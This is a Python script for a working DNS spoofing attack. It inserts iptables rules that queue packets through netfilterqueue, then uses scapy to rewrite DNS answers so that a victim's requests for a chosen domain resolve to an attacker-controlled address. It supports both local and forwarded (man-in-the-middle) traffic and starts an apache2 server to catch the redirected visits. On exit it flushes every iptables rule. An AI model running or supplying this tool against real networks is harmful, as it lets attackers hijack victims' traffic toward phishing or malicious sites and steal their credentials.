#!/usr/bin/env python3


import netfilterqueue
import subprocess
import scapy.all as scapy

qqname = input("Target web > ")  # Ex: www.google.com
rrdata = input("Redirection to  > ")  # Ex: 216.239.38.120

subprocess.call("\n\nservice apache2 start", shell=True)  # Starting apache2 server.
print("\n[+] Starting the Server")


def process_packet(packet):
    # print(packet)
    # print(packet.get_payload()) # Getting payload
    scapy_packet = scapy.IP(
        packet.get_payload())  # Converting the packet to scapy packet so that we can interact with them.

    if scapy_packet.haslayer(scapy.DNSRR):  # Finding the DNS for specific site
        qname = scapy_packet[scapy.DNSQR].qname  # DNSQR is Question Record for DNS
        # DNSRQ is for DNS Request and for DNS Response we use DNSRR
        if qqname in str(qname):
            print(
                "\u001b[33m[+] Redirecting target from \u001b[0m " + "\u001b[1m\u001b[32m" + qqname + "\u001b[0m" + "\u001b[33mto\u001b[0m " + "\u001b[1m\u001b[31m" + rrdata + "\u001b[0m")
            answer = scapy.DNSRR(rrname=qname, rdata=rrdata)  # Modifying the DNS Record
            # print(scapy_packet.show())
            scapy_packet[scapy.DNS].an = answer  # Implementing the changes
            scapy_packet[scapy.DNS].ancount = 1  # Modifying ancount(answer count to 1)

            # Removing the following items so that they can't corrupt our modified packet
            # Scapy will automatically calculate these according to our modified packet
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


try:
    choice = input("\n1 - Host DNS Spoofing\n2 - Remote DNS Spoofing\nEnter your choice: ")
    print(choice)
    if choice == 2 or choice == "2":  # Had to add "or" condition so that it supports both python2 and python3
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        print("\n[+] Created IPTABLE for FORWARD\n")

    elif choice == 1 or choice == "1":
        subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
        subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
        print("\n[+] Created iptable for INPUT and OUTPUT\n")
    else:
        print("[-] Invalid Choice.... Exiting.....")
        exit()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C........ Exiting.......")
    subprocess.call("iptables --flush", shell=True)
